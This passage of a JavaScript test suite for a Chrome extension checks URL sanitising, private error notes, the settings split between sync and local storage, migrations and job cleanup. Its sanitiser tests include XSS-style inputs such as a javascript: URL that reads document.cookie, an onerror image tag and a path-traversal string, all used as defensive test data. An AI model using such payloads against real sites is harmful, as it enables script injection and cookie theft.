    const fine = await bg.send({ type: 'SK_TAB_INFO', tabId: 1 });
    check('an ordinary https page is NOT caught by any of the new rows',
      fine.ok === true, JSON.stringify(fine.error || 'ok'));
  });

  await runSection('canonical', async () => {
    const { chrome, bg } = boot();
    const originOf = bg.sandbox.originOf;
    const LAST_ERROR_KEY = bg.eval('LAST_ERROR_KEY');
    const GENERIC = bg.eval('R_GENERIC');

    check('the apostrophe url reduces to scheme + host',
      originOf(HOSTILE_URL) === 'https://bank.example', originOf(HOSTILE_URL));
    check('userinfo — a password — is dropped',
      originOf('https://ada:hunter2@bank.example/x') === 'https://bank.example',
      originOf('https://ada:hunter2@bank.example/x'));
    check('the LAST @ is the separator, so an @ inside userinfo cannot hide the host',
      originOf("https://ad'a@b@bank.example/p?t=" + SECRET) === 'https://bank.example',
      originOf("https://ad'a@b@bank.example/p?t=" + SECRET));
    check('a javascript: url reduces to the scheme, never the payload',
      originOf('javascript:alert(document.cookie)') === 'javascript:',
      originOf('javascript:alert(document.cookie)'));
    check('a data: url reduces to the scheme, never the markup',
      originOf('data:text/html,<script>fetch(1)</script>') === 'data:',
      originOf('data:text/html,<script>fetch(1)</script>'));
    check('a scheme-relative url yields nothing rather than a guess',
      originOf('//bank.example/p?t=' + SECRET) === '', JSON.stringify(originOf('//bank.example/p?t=' + SECRET)));
    check('null and undefined yield the empty string',
      originOf(null) === '' && originOf(undefined) === '', 'no throw, no "null"');
    check('a port survives (it is part of the authority)',
      originOf('https://1.2.3.4:8443/admin?k=' + SECRET) === 'https://1.2.3.4:8443',
      originOf('https://1.2.3.4:8443/admin?k=' + SECRET));

    /* The property, over a generated space rather than a handful of cases:
       NOTHING after the first '/', '?' or '#' of the authority may appear in the
       output. Everything hostile in the generator lives in the path, the query
       or the fragment. */
    const SCHEMES = ['https://', 'http://', 'HTTPS://', 'ftp://', 'chrome://', 'file:///', 'blob:https://', 'javascript:', 'data:', '//', ''];
    const AUTHS = ['bank.example', 'ada:hunter2@bank.example', "ad'a@bank.example", 'a@b@bank.example',
      '[::1]', '1.2.3.4:8443', 'xn--n3h.example', 'localhost'];
    const TAILS = ["/it's/statement?token=" + SECRET, '/<img src=x onerror=alert(1)>?k=' + SECRET,
      '/a"b\'c`d#' + SECRET, '/..%2f..%2fetc?p=' + SECRET, '?q=<script>' + SECRET + '</script>',
      '#' + SECRET, '/\t/x?' + SECRET, '/%27%22?z=' + SECRET, ''];
    let bad = null, n = 0;
    for (const s of SCHEMES) for (const a of AUTHS) for (const t of TAILS) {
      const u = s + a + t;
      const o = originOf(u);
      n++;
      const afterScheme = o.replace(/^[a-z][a-z0-9+.-]*:(\/\/)?/i, '');
      if (o.indexOf(SECRET) >= 0) { bad = 'token survived: ' + u + ' -> ' + o; break; }
      if (o.indexOf('@') >= 0) { bad = 'userinfo survived: ' + u + ' -> ' + o; break; }
      if (/[\/?#<>]/.test(afterScheme)) { bad = 'path/query survived: ' + u + ' -> ' + o; break; }
      if (o.length > u.length) { bad = 'output grew: ' + u + ' -> ' + o; break; }
    }
    check(n + ' generated urls: no token, no userinfo, no path, no query, no fragment survives',
      bad === null, bad || 'origin only, every time');

    /* And now the whole thing end to end: the note that a real failure parks. */
    await bg.sandbox.recordError('read-title', HOSTILE_MSG, { id: 7, url: HOSTILE_URL });
    /* `|| {}` on purpose. A teeth run that moved the note to storage.local made
       this line throw, the sim died here, and the 140 checks after it — including
       the one that names that exact bug — never ran. The checks below now report
       an empty note instead of ending the run. */
    const parked = chrome.storage.session.__data.get(LAST_ERROR_KEY) || {};

    check('a note was parked in storage.session',
      !!chrome.storage.session.__data.get(LAST_ERROR_KEY), JSON.stringify(parked));
    check('the note reason is the generic KEY, not the engine string',
      parked.reason === GENERIC, parked.reason);
    check('the note origin is scheme + host', parked.origin === 'https://bank.example', parked.origin);

    const noteJson = JSON.stringify(parked);
    check('the parked note contains no token', noteJson.indexOf(SECRET) < 0, noteJson);
    check('the parked note contains no path — the apostrophe segment is gone',
      noteJson.indexOf("it's") < 0, noteJson);
    check('the parked note contains no query and no fragment',
      noteJson.indexOf('token=') < 0 && noteJson.indexOf('frag') < 0, noteJson);
    check('the note carries what makes one sentence actionable: when, action, origin, tabId',
      typeof parked.when === 'number' && parked.action === 'read-title' && parked.tabId === 7 &&
      Object.keys(parked).sort().join(',') === 'action,origin,reason,tabId,when',
      Object.keys(parked).sort().join(','));

    /* `action` arrives ON a message, so it gets the same treatment. */
    await bg.sandbox.recordError(HOSTILE_TITLE, 'reasonBusy', { id: 7, url: HOSTILE_URL });
    const parked2 = chrome.storage.session.__data.get(LAST_ERROR_KEY) || {};
    check('an unrecognised action becomes the neutral word "run"',
      parked2.action === 'run', parked2.action);
    check('the hostile action string is nowhere in the note',
      JSON.stringify(parked2).indexOf('img src') < 0, JSON.stringify(parked2));

    check('the note lives in storage.session only — NOT local',
      chrome.storage.local.__data.size === 0, chrome.storage.local.__data.size + ' local keys');
    check('the note lives in storage.session only — NOT sync',
      !chrome.storage.sync.__data.has(LAST_ERROR_KEY),
      JSON.stringify(Array.from(chrome.storage.sync.__data.keys())));

    await bg.sandbox.clearError();
    check('clearError removes the note', !chrome.storage.session.__data.has(LAST_ERROR_KEY),
      chrome.storage.session.__data.size + ' session keys left');

    /* A note must be parkable even when the browser refuses to park it. */
    const origSet = chrome.storage.session.set;
    chrome.storage.session.set = () => Promise.reject(new Error('QuotaExceeded'));
    let threw = false;
    try { await bg.sandbox.recordError('read-title', 'This tab is already busy.', { id: 1, url: 'https://a.example/' }); }
    catch (_) { threw = true; }
    chrome.storage.session.set = origSet;
    check('a note that cannot be parked never fails the work that produced it', !threw, 'recordError swallowed the storage error');
  });

  await runSection('settings', async () => {
    const { chrome, bg } = boot();
    const D = bg.sandbox.SK_DEFAULTS;

    check('there is exactly ONE defaults table, and the worker sees it',
      D && typeof D === 'object', JSON.stringify(D));
    check('defaults: theme follows the system', D.theme === 'system', D.theme);
    check('PRIVACY DEFAULT — keepHistory is OFF until the user turns it on',
      D.keepHistory === false, String(D.keepHistory));
    check('defaults: copyOnOpen is off', D.copyOnOpen === false, String(D.copyOnOpen));
    check('defaults: historyLimit is a positive finite number',
      Number.isFinite(D.historyLimit) && D.historyLimit > 0, String(D.historyLimit));

    const fresh = await bg.sandbox.skGetSettings();
    check('an empty profile reads back exactly the defaults',
      JSON.stringify(fresh) === JSON.stringify(D), JSON.stringify(fresh));

    await chrome.storage.sync.set({ historyLimit: 7, keepHistory: true, somethingElse: 'x' });
    const merged = await bg.sandbox.skGetSettings();
    check('stored values win over defaults',
      merged.historyLimit === 7 && merged.keepHistory === true, JSON.stringify(merged));
    check('unset keys still come from defaults',
      merged.theme === 'system' && merged.copyOnOpen === false, JSON.stringify(merged));
    check('an undeclared stored key is not handed to the feature',
      !('somethingElse' in merged), Object.keys(merged).join(','));

    const origGet = chrome.storage.sync.get;
    chrome.storage.sync.get = () => Promise.reject(new Error('storage is unavailable'));
    let readThrew = false, defaultsBack = null;
    try { defaultsBack = await bg.sandbox.skGetSettings(); } catch (_) { readThrew = true; }
    chrome.storage.sync.get = origGet;
    check('a settings read that fails returns defaults instead of throwing',
      !readThrew && defaultsBack && defaultsBack.theme === 'system', JSON.stringify(defaultsBack));

    /* Migrations, on the real runner. SK_MIGRATIONS is the same object the
       module closed over, so adding a row here is what a tool author does.
       The counter is a CLOSURE variable, not a field on the settings object:
       counting on the object would only work if the migrator persisted
       undeclared keys, which would make this check silently a test of that
       instead of a test of idempotence. */
    let migrationRuns = 0;
    bg.sandbox.SK_MIGRATIONS[1] = () => { migrationRuns++; };
    const m1 = await bg.sandbox.skMigrateSettings();
    check('a v0 profile runs the migration to v1 exactly once', migrationRuns === 1, 'ran ' + migrationRuns + 'x');
    check('migration preserves the user\'s values',
      m1.historyLimit === 7 && m1.keepHistory === true, JSON.stringify({ historyLimit: m1.historyLimit, keepHistory: m1.keepHistory }));
    check('migration stamps the schema version',
      m1.skSchemaVersion === bg.sandbox.SK_SETTINGS_VERSION, String(m1.skSchemaVersion));

    await bg.sandbox.skMigrateSettings();
    check('migration is idempotent — a second run does not re-run it', migrationRuns === 1, 'ran ' + migrationRuns + 'x');

    await chrome.storage.sync.set({ skSchemaVersion: 0 });
    bg.sandbox.SK_MIGRATIONS[1] = () => { throw new Error('boom'); };
    let migThrew = false, m3 = null;
    try { m3 = await bg.sandbox.skMigrateSettings(); } catch (_) { migThrew = true; }
    /* This check used to assert the stamp reached SK_SETTINGS_VERSION after a
       throw — i.e. it CERTIFIED the bug, which is worse than not testing it.
       The profile must survive (no rejection, values intact) and the stamp must
       NOT advance past the migration that failed; the retry is graded below. */
    check('a THROWING migration does not brick the profile — and does not count as done',
      !migThrew && m3 && m3.historyLimit === 7 && m3.skSchemaVersion === 0,
      'values intact, stamp still ' + (m3 && m3.skSchemaVersion));
    check('the broken migration is named in the log',
      /migration 1 failed/.test(bg.logText()), 'console.error carries it');
    delete bg.sandbox.SK_MIGRATIONS[1];

    /* ---- THE PARTITION ----
       chrome.storage.sync is an UPLOAD for anyone signed in with sync on. The
       question every one of these checks is really asking is: would you be
       comfortable seeing this value in a Google account export? */
    const SYNC = bg.sandbox.SK_SYNC_KEYS, LOCAL = bg.sandbox.SK_LOCAL_KEYS;
    const allKeys = Object.keys(D);
    const unpartitioned = allKeys.filter(k => SYNC.indexOf(k) < 0 && LOCAL.indexOf(k) < 0);
    const doubled = allKeys.filter(k => SYNC.indexOf(k) >= 0 && LOCAL.indexOf(k) >= 0);
    check('every settings key is declared in EXACTLY ONE storage area',
      unpartitioned.length === 0 && doubled.length === 0,
      unpartitioned.length ? 'no area: ' + unpartitioned.join(',') :
        doubled.length ? 'both areas: ' + doubled.join(',') :
          SYNC.length + ' sync / ' + LOCAL.length + ' local');
    const strayInLists = SYNC.concat(LOCAL).filter(k => !(k in D));
    check('neither key list names a key that has no default',
      strayInLists.length === 0, strayInLists.join(',') || 'none');
    /* The rule with teeth: nothing free-text may sync. A string DEFAULT is the
       only shape a static check can see, and it is the shape every one of the
       dangerous cases starts as — a filename template, a hostname rule, a
       redaction wordlist. An enum default (theme: 'system') is exempt because
       its whole value space is declared in the catalogue. */
    const SK_ENUMS = /const SK_SAFE_SETTING_VALUES = \[([^\]]*)\]/
      .exec(H.readRoot('pages/common.js'));
    const enumValues = (SK_ENUMS ? SK_ENUMS[1] : '').split(',').map(s => s.trim().replace(/'/g, '')).filter(Boolean);
    const freeTextSynced = SYNC.filter(k => typeof D[k] === 'string' && enumValues.indexOf(D[k]) < 0);
    check('no SYNCED key defaults to free text — an enum is fine, a filename template is not',
      freeTextSynced.length === 0,
      freeTextSynced.length ? 'free text in sync: ' + freeTextSynced.join(',') : 'enums only: ' + enumValues.join('|'));

    const writeSync = await bg.sandbox.skSetSettings({ theme: 'dark', skPersistAsked: true });
    check('a write is routed to the area each key was declared in',
      writeSync.ok === true &&
      chrome.storage.sync.__data.get('theme') === 'dark' &&
      chrome.storage.local.__data.get('skPersistAsked') === true &&
      !chrome.storage.sync.__data.has('skPersistAsked'),
      'sync=' + JSON.stringify(Array.from(chrome.storage.sync.__data.keys())) +
      ' local=' + JSON.stringify(Array.from(chrome.storage.local.__data.keys())));
    const bothBack = await bg.sandbox.skGetSettings();
    check('a read stitches both areas back together, so callers never see the split',
      bothBack.theme === 'dark' && bothBack.skPersistAsked === true, JSON.stringify(bothBack));

    /* A key that MOVED areas. The stale copy left behind in sync is the whole
       problem: the code stops reading it and the browser keeps uploading it. */
    await chrome.storage.sync.set({ skPersistAsked: true });
    await bg.sandbox.skMigrateSettings();
    check('migration re-homes a key found in the wrong area and DELETES the stale copy',
      !chrome.storage.sync.__data.has('skPersistAsked') &&
      chrome.storage.local.__data.get('skPersistAsked') === true,
      'sync still has it: ' + chrome.storage.sync.__data.has('skPersistAsked'));

    /* skSetSettings ANSWERS, it never throws. */
    const tooBig = await bg.sandbox.skSetSettings({ theme: 'x'.repeat(9000) });
    check('an oversized value is refused BEFORE the write, with a declared reason',
      tooBig.ok === false && tooBig.reason === 'reasonSettingTooBig' &&
      chrome.storage.sync.__data.get('theme') === 'dark',
      JSON.stringify(tooBig) + ' — the stored value is untouched: ' + chrome.storage.sync.__data.get('theme'));
    chrome.__failOnce('storage.sync.set', new Error('MAX_WRITE_OPERATIONS_PER_MINUTE quota exceeded'));
    let setThrew = false, refused = null;
    try { refused = await bg.sandbox.skSetSettings({ theme: 'light' }); } catch (_) { setThrew = true; }
    check('a REJECTED write is answered, not thrown — the caller can never leak an unhandled rejection',
      !setThrew && refused && refused.ok === false && refused.reason === 'reasonSettingsWriteFailed',
      setThrew ? 'it threw' : JSON.stringify(refused));
    check('the engine\'s own words go to the console and NOT into the answer',
      /MAX_WRITE_OPERATIONS/.test(bg.logText()) &&
      JSON.stringify(refused).indexOf('MAX_WRITE') < 0, 'declared key only');

    /* Reset. Settings are the one category of data that can leave the machine,
       so they must be the one category the user can take back. */
    await bg.sandbox.skSetSettings({ historyLimit: 999, keepHistory: true, skPersistAsked: true });
    const reset = await bg.sandbox.skResetSettings();
    const afterReset = await bg.sandbox.skGetSettings();
    check('"Reset settings" puts EVERY declared key back to its default, in both areas',
      reset.ok === true && JSON.stringify(afterReset) === JSON.stringify(D),
      JSON.stringify(afterReset));

    /* Live updates, and the two things they must ignore. */
    const seen = [];
    bg.sandbox.skOnSettingsChanged(p => seen.push(p));
    await chrome.storage.local.set({ theme: 'dark' });
    check('a SYNC key changed in the LOCAL area is ignored — the partition is not advisory',
      seen.length === 0, seen.length + ' callbacks');
    await chrome.storage.sync.set({ notASetting: 1 });
    check('a change to an undeclared key is ignored', seen.length === 0, seen.length + ' callbacks');
    await chrome.storage.sync.set({ theme: 'dark' });
    check('a declared sync key fires with only that key',
      seen.length === 1 && seen[0].theme === 'dark' && Object.keys(seen[0]).length === 1,
      JSON.stringify(seen));
    await chrome.storage.local.set({ skPersistAsked: true });
    check('a declared LOCAL key fires too, so a caller never has to know the area',
      seen.length === 2 && seen[1].skPersistAsked === true, JSON.stringify(seen));

    /* Install and update, on the real listeners. */
    const { chrome: c2, bg: bg2 } = boot();
    await Promise.all(c2.__fire('runtime.onInstalled', { reason: 'install' }));
    await tick();
    check('a fresh install writes the defaults and the schema version',
      c2.storage.sync.__data.get('skSchemaVersion') === bg2.sandbox.SK_SETTINGS_VERSION &&
      c2.storage.sync.__data.get('keepHistory') === false,
      JSON.stringify(Object.fromEntries(c2.storage.sync.__data)));

    const { chrome: c3, bg: bg3 } = boot();
    await c3.storage.sync.set({ historyLimit: 9 });
    await Promise.all(c3.__fire('runtime.onInstalled', { reason: 'update' }));
    await tick();
    check('an update migrates instead of overwriting the user\'s values',
      c3.storage.sync.__data.get('historyLimit') === 9 &&
      c3.storage.sync.__data.get('skSchemaVersion') === bg3.sandbox.SK_SETTINGS_VERSION,
      JSON.stringify(Object.fromEntries(c3.storage.sync.__data)));

    /* ---- INSTALL IS NOT A BLANK SLATE ----
       `reason: 'install'` does NOT mean "this user is new". It fires on the
       SECOND DEVICE of a signed-in profile, where chrome.storage.sync has
       already replicated the settings from the first one — and it fires again
       after a remove-and-reinstall on the same machine. An unconditional
       Object.assign({}, SK_DEFAULTS, …) write on that path is a settings wipe
       across every device on the account, and because it also stamps the
       CURRENT schema version, the migration that should have converted those
       values can never run afterwards. Two losses from one line, and the second
       one is silent. */
    const { chrome: c4, bg: bg4 } = boot();
    let installMigrations = 0;
    bg4.sandbox.SK_MIGRATIONS[1] = () => { installMigrations++; };
    await c4.storage.sync.set({ theme: 'dark', keepHistory: true, historyLimit: 7, skSchemaVersion: 0 });
    await Promise.all(c4.__fire('runtime.onInstalled', { reason: 'install' }));
    await tick(3);
    check('INSTALL on a profile that already carries synced settings PRESERVES them',
      c4.storage.sync.__data.get('theme') === 'dark' &&
      c4.storage.sync.__data.get('keepHistory') === true &&
      c4.storage.sync.__data.get('historyLimit') === 7,
      JSON.stringify(Object.fromEntries(c4.storage.sync.__data)));
    check('and it MIGRATES them rather than stamping them as already current',
      installMigrations === 1, 'ran ' + installMigrations + 'x');
    check('a key the profile has never held still gets its default on install',
      c4.storage.sync.__data.get('retentionDays') === D.retentionDays,
      'retentionDays=' + c4.storage.sync.__data.get('retentionDays'));
    delete bg4.sandbox.SK_MIGRATIONS[1];

    /* A profile with no stamp and not one declared key has never been written
       by this tool. It is BORN at the current schema: running a historical
       migration against defaults it was never shaped by is at best a no-op and
       at worst a transform applied twice the first time somebody writes one
       that is not idempotent. */
    const { chrome: c4b, bg: bg4b } = boot();
    let virginRuns = 0;
    bg4b.sandbox.SK_MIGRATIONS[1] = () => { virginRuns++; };
    await Promise.all(c4b.__fire('runtime.onInstalled', { reason: 'install' }));
    await tick(3);
    check('a profile that has never held a single key is BORN at the current schema',
      virginRuns === 0 && c4b.storage.sync.__data.get('skSchemaVersion') === bg4b.sandbox.SK_SETTINGS_VERSION,
      'migrations run: ' + virginRuns + ', stamped at ' + c4b.storage.sync.__data.get('skSchemaVersion'));
    delete bg4b.sandbox.SK_MIGRATIONS[1];

    /* ---- A NEWER SCHEMA IS NEVER DOWNGRADED ----
       Two devices, one profile, one of them updated first. The old build reads
       skSchemaVersion 4, runs no migrations (it has none above 1), and then
       stamps the value DOWN to 1 — so when the newer build next syncs it re-runs
       migrations 2, 3 and 4 over data that has already been through them. The
       stamp is the only thing standing between a user and a double migration,
       and re-writing it downward is how it gets knocked over. */
    const { chrome: c5, bg: bg5 } = boot();
    let ranOnDowngrade = 0;
    bg5.sandbox.SK_MIGRATIONS[1] = () => { ranOnDowngrade++; };
    await c5.storage.sync.set({ skSchemaVersion: 4, theme: 'dark', historyLimit: 11 });
    const downgraded = await bg5.sandbox.skMigrateSettings();
    check('a profile stamped NEWER than this build is left at its own version',
      c5.storage.sync.__data.get('skSchemaVersion') === 4,
      'stamp is now ' + c5.storage.sync.__data.get('skSchemaVersion'));
    check('and no migration runs against data a newer build already migrated',
      ranOnDowngrade === 0, 'ran ' + ranOnDowngrade + 'x');
    check('the settings a newer build wrote are still readable and untouched',
      downgraded && downgraded.theme === 'dark' && c5.storage.sync.__data.get('historyLimit') === 11,
      JSON.stringify({ theme: downgraded && downgraded.theme, historyLimit: c5.storage.sync.__data.get('historyLimit') }));
    delete bg5.sandbox.SK_MIGRATIONS[1];

    /* The guard's real work, and the reason the check above could not see it.
       `reached` starts at `from`, so the stamp cannot travel backwards whatever
       happens — which made "the stamp is not downgraded" true by construction
       and green with the guard deleted. What the guard actually prevents is an
       older build TIDYING a layout it does not understand: re-homing keys
       between areas, deleting the copy it thinks is stale, and writing every
       key it knows about back over a newer set. Here `skPersistAsked` sits in
       sync, which THIS build calls the wrong area — an older build must not
       "fix" that, because a newer one may have moved it there on purpose. */
    const { chrome: c5b, bg: bg5b } = boot();
    await c5b.storage.sync.set({ skSchemaVersion: 9, skPersistAsked: true, theme: 'dark' });
    await bg5b.sandbox.skMigrateSettings();
    check('a build that does not understand the profile WRITES NOTHING to it',
      c5b.storage.sync.__data.get('skPersistAsked') === true &&
      !c5b.storage.local.__data.has('skPersistAsked') &&
      c5b.storage.sync.__data.get('skSchemaVersion') === 9,
      'the key a newer build put in sync is still in sync, un-re-homed and un-deleted');

    /* ---- A FAILED MIGRATION IS RETRIED, NOT FORGOTTEN ----
       Catching the throw is right; stamping the version afterwards is not. It
       marks the profile as migrated with half-converted data and guarantees the
       migration never runs again on that device. The console.error lands in a
       service worker nobody is watching, so the only signal is a tool behaving
       strangely for one user, forever. */
    const { chrome: c6, bg: bg6 } = boot();
    let attempts = 0;
    bg6.sandbox.SK_MIGRATIONS[1] = () => { attempts++; if (attempts === 1) throw new Error('boom'); };
    await c6.storage.sync.set({ skSchemaVersion: 0, historyLimit: 13 });
    await bg6.sandbox.skMigrateSettings();
    check('a migration that THREW does not advance the schema stamp past itself',
      (Number(c6.storage.sync.__data.get('skSchemaVersion')) || 0) === 0,
      'stamp is now ' + c6.storage.sync.__data.get('skSchemaVersion'));
    check('the failure is recorded where a problem report can see it',
      c6.storage.local.__data.get('skMigrationFailedAt') === 1,
      'skMigrationFailedAt=' + c6.storage.local.__data.get('skMigrationFailedAt'));
    check('the user\'s values survive the failed attempt',
      c6.storage.sync.__data.get('historyLimit') === 13,
      'historyLimit=' + c6.storage.sync.__data.get('historyLimit'));
    await Promise.all(c6.__fire('runtime.onInstalled', { reason: 'update' }));
    await tick(3);
    check('the NEXT update retries it — a failed migration is a deferred one',
      attempts === 2, attempts + ' attempt(s)');
    check('and once it succeeds the stamp advances and the marker is cleared',
      Number(c6.storage.sync.__data.get('skSchemaVersion')) === bg6.sandbox.SK_SETTINGS_VERSION &&
      !c6.storage.local.__data.get('skMigrationFailedAt'),
      'stamp=' + c6.storage.sync.__data.get('skSchemaVersion') +
      ' marker=' + c6.storage.local.__data.get('skMigrationFailedAt'));
    delete bg6.sandbox.SK_MIGRATIONS[1];
  });

  await runSection('jobs', async () => {
    const { chrome, bg } = boot();

    check('the worker registers every abandonment source it claims to',
      chrome.__hasListener('tabs.onRemoved') && chrome.__hasListener('tabs.onUpdated') &&
      chrome.__hasListener('windows.onRemoved') && chrome.__hasListener('runtime.onStartup') &&
      chrome.__hasListener('runtime.onSuspend'),
      'tabs.onRemoved · tabs.onUpdated · windows.onRemoved · runtime.onStartup · runtime.onSuspend');

    const job = await bg.sandbox.beginJob({ id: 11, windowId: 3 }, 'read-title');
    await tick();
    check('a running job owns exactly one scratch row', scratchCount(bg) === 1, 'scratch=' + scratchCount(bg));
    check('a running job owns a job-table entry', bg.sandbox.SKJOBS.size() === 1, 'jobs=' + bg.sandbox.SKJOBS.size());
    check('the job id is not derived from anything the page controls',
      /^[0-9a-f-]{36}$|^j[0-9a-z]+$/i.test(job.jobId), job.jobId);

    bg.fire('tabs.onRemoved', 11);
    await tick();
    check('a closed tab drops the table entry AND the scratch row',
      bg.sandbox.SKJOBS.size() === 0 && scratchCount(bg) === 0,
      'jobs=' + bg.sandbox.SKJOBS.size() + ' scratch=' + scratchCount(bg));

    await bg.sandbox.beginJob({ id: 12, windowId: 3 }, 'read-title');
    await tick();
    bg.fire('tabs.onUpdated', 12, { status: 'complete' });
    await tick();
    check('a finished LOAD does not abort a job',
      bg.sandbox.SKJOBS.size() === 1 && scratchCount(bg) === 1, 'jobs=' + bg.sandbox.SKJOBS.size());
    bg.fire('tabs.onUpdated', 12, { status: 'loading' });
    await tick();
    check('navigating away mid-job aborts it and drops its scratch',
      bg.sandbox.SKJOBS.size() === 0 && scratchCount(bg) === 0,
      'jobs=' + bg.sandbox.SKJOBS.size() + ' scratch=' + scratchCount(bg));

    await bg.sandbox.beginJob({ id: 13, windowId: 3 }, 'read-title');
    await bg.sandbox.beginJob({ id: 14, windowId: 4 }, 'read-title');
    await tick();
    bg.fire('windows.onRemoved', 3);
    await tick();
    check('closing a window aborts only ITS jobs',
      bg.sandbox.SKJOBS.size() === 1 && bg.sandbox.SKJOBS.keys()[0] === 14 && scratchCount(bg) === 1,
      'left: tab ' + bg.sandbox.SKJOBS.keys()[0]);

    bg.fire('tabs.onRemoved', 14);
    await tick();
    check('abortJob on a tab with no job is a no-op, not a crash',
      bg.sandbox.abortJob(9999, 'nothing here') === null, 'returned null');

    /* Two jobs, adjacent key prefixes: one job's delete must not reach the
       other's rows. ':' is 0x3A and ';' is 0x3B, so [id:, id;) is exactly one
       job's range. */
    const jA = await bg.sandbox.beginJob({ id: 21, windowId: 5 }, 'read-title');
    const jB = await bg.sandbox.beginJob({ id: 22, windowId: 5 }, 'read-title');
    await bg.sandbox.SKDB.put('scratch', { k: bg.sandbox.SKDB.scratchKey(jA.jobId, 1), jobId: jA.jobId });
    await bg.sandbox.SKDB.put('scratch', { k: bg.sandbox.SKDB.scratchKey(jA.jobId, 2), jobId: jA.jobId });
    await tick();
    check('a multi-row job keeps all its rows in one contiguous range',
      scratchCount(bg) === 4, 'scratch=' + scratchCount(bg));
    bg.sandbox.abortJob(21, 'test');
    await tick();
    const left = bg.idb.indexedDB.__rows(DB_NAME, 'scratch');
    check('aborting job A deletes all THREE of its rows and none of job B\'s',
      left.length === 1 && left[0].jobId === jB.jobId, 'left=' + JSON.stringify(left.map(r => r.k)));
    check('the scratch key is zero-padded so the range stays ordered',
      bg.sandbox.SKDB.scratchKey('X', 7) === 'X:00007', bg.sandbox.SKDB.scratchKey('X', 7));
    bg.sandbox.abortJob(22, 'test');
    await tick();

    /* The success path obeys the same rule as every failure path. */
    const okResp = await bg.send({ type: 'SK_TAB_INFO', tabId: 1 });
    await tick();
    check('a SUCCESSFUL job leaves no scratch behind either',
      okResp.ok === true && scratchCount(bg) === 0 && bg.sandbox.SKJOBS.size() === 0,
      'scratch=' + scratchCount(bg));
    check('keepHistory OFF means a successful job stores nothing',
      okResp.kept === false && itemCount(bg) === 0, 'items=' + itemCount(bg));

    /* Busy: refused BEFORE a job exists, so a second caller cannot kill the first. */
    await bg.sandbox.beginJob({ id: 1, windowId: 1 }, 'read-title');
    await tick();
    const busy = await bg.send({ type: 'SK_TAB_INFO', tabId: 1 });
    check('a second call on a busy tab is refused', busy.error === 'reasonBusy', busy.error);
    check('being refused did not disturb the job that was already running',
      bg.sandbox.SKJOBS.size() === 1 && scratchCount(bg) === 1, 'jobs=' + bg.sandbox.SKJOBS.size());
    await bg.send({ type: 'SK_JOB_CANCEL', tabId: 1 });
    await tick();
    check('a user cancel routes through the same abort hook',
      bg.sandbox.SKJOBS.size() === 0 && scratchCount(bg) === 0, 'scratch=' + scratchCount(bg));

    /* keepHistory ON: stored, listed, capped. */
    await chrome.storage.sync.set({ keepHistory: true, historyLimit: 2 });
    for (const id of [1, 1, 1]) { await bg.send({ type: 'SK_TAB_INFO', tabId: id }); await tick(2); }
    check('keepHistory ON stores finished work where the user can see it',
      itemCount(bg) > 0, 'items=' + itemCount(bg));
    check('history is capped at historyLimit — the oldest are dropped',
      itemCount(bg) === 2, 'items=' + itemCount(bg));

    await bg.sandbox.beginJob({ id: 31, windowId: 1 }, 'read-title');
    await tick();
    const cleared = await bg.send({ type: 'SK_CLEAR_DATA' });
    await tick();
    check('"Delete everything" aborts what is in flight, then empties both stores',
      cleared.ok === true && itemCount(bg) === 0 && scratchCount(bg) === 0 && bg.sandbox.SKJOBS.size() === 0,
      'items=' + itemCount(bg) + ' scratch=' + scratchCount(bg) + ' jobs=' + bg.sandbox.SKJOBS.size());

    /* Browser start: nothing can legitimately be in flight, so a blanket wipe
       is correct HERE and nowhere else. */
    await bg.sandbox.SKDB.put('scratch', { k: 'orphan:00000', jobId: 'orphan' });
    await tick();
    check('an orphaned scratch row exists to be swept', scratchCount(bg) === 1, 'scratch=' + scratchCount(bg));
    bg.fire('runtime.onStartup');
    await tick();
    check('onStartup sweeps scratch nobody owns', scratchCount(bg) === 0, 'scratch=' + scratchCount(bg));

    /* onSuspend: the last chance before the worker is killed. Not guaranteed to
       fire, which is why the wake sweep exists as well — but when it does fire
       it closes the hole NOW instead of at the next wake, which may be an hour
       away. */
    await bg.sandbox.beginJob({ id: 41, windowId: 9 }, 'read-title');
    await bg.sandbox.beginJob({ id: 42, windowId: 9 }, 'read-title');
    await tick();
    check('two jobs are in flight when the browser decides to suspend the worker',
      bg.sandbox.SKJOBS.size() === 2 && scratchCount(bg) === 2,
      'jobs=' + bg.sandbox.SKJOBS.size() + ' scratch=' + scratchCount(bg));
    bg.fire('runtime.onSuspend');
    await tick();
    check('onSuspend gives up EVERY job and drops all of their scratch',
      bg.sandbox.SKJOBS.size() === 0 && scratchCount(bg) === 0,
      'jobs=' + bg.sandbox.SKJOBS.size() + ' scratch=' + scratchCount(bg));

    /* ================================================================
       LEAVE NO TRACE ON THE PAGE EITHER
       ================================================================
       dropScratch() undoes what a job wrote to the DATABASE. Nothing used to
       undo what it did to the PAGE, and that is the half the reference
       implementation carried for 25 sessions.

       An abandoned full-page overlay that was capturing clicks and key events,
       left on a page the user is still typing into, is not a cosmetic bug — and
       it is left behind by the ordinary cases: the tab navigated, the window
       closed, the worker was suspended, the watchdog gave up.

       The skeleton ships no content script (it does not need one, and shipping
       one would hand 67 tools a permission and a second purpose they have not
       asked for). What it ships is the HOOK, live, on the one path every abort
       already goes through — so a tool that grows a content script has nothing
       to remember except writing revert() at the other end. */
    const rev = boot();
    await tick();
    await rev.bg.sandbox.beginJob({ id: 51, windowId: 9 }, 'read-title');
    rev.chrome.__clearCalls();
    rev.bg.sandbox.abortJob(51, 'tab navigated');
    await tick(2);
    const sent = rev.chrome.__callsOf('tabs.sendMessage');
    check('every abort tells the PAGE to put itself back, not just the database',
      sent.length === 1 && sent[0].args[1] && sent[0].args[1].type === 'SK_PAGE_REVERT',
      sent.length ? JSON.stringify(sent[0].args) : 'no revert was sent');
    check('the revert goes to the job\'s own tab and carries no payload to leak',
      sent.length === 1 && sent[0].args[0] === 51 &&
      Object.keys(sent[0].args[1]).join(',') === 'type',
      sent.length ? 'tab ' + sent[0].args[0] + ' ' + JSON.stringify(sent[0].args[1]) : '—');

    /* A tab with no content script listening REJECTS. Cleanup must not be able
       to mask the failure it is cleaning up after. */
    rev.chrome.__failOnce('tabs.sendMessage', new Error('Could not establish connection. Receiving end does not exist.'));
    let threw = false;
    try { rev.bg.sandbox.abortJob(41, 'nothing is listening'); } catch (_) { threw = true; }
    await tick(4);
    check('a tab with nothing listening does not turn cleanup into a crash',
      !threw, 'best-effort, and the rejection is swallowed');

    check('the revert is a LIVE CALL inside abortJob, not a comment telling you to add one',
      /revertPage\s*\(\s*tabId\s*\)/.test(stripJsComments(H.readRoot('background.js'))),
      'abortJob -> revertPage(tabId)');
  });

  /* ================================================================== */
  /* lifetime — the worker dies mid-job, several times an hour           */
  /* ================================================================== */
